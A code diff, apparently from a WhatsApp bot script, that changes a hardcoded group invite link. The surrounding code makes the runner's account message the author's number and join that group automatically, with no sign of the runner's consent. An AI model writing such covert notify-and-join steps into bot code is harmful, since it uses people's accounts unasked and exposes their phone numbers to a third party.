@@ -58,7 +58,7 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
-    teks = `https://chat.whatsapp.com/FNKtM0du8DR7kLooD0kvDl`
+    teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
     DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
     
     await DogeXeonOP.connect({timeoutMs: 30*1000})
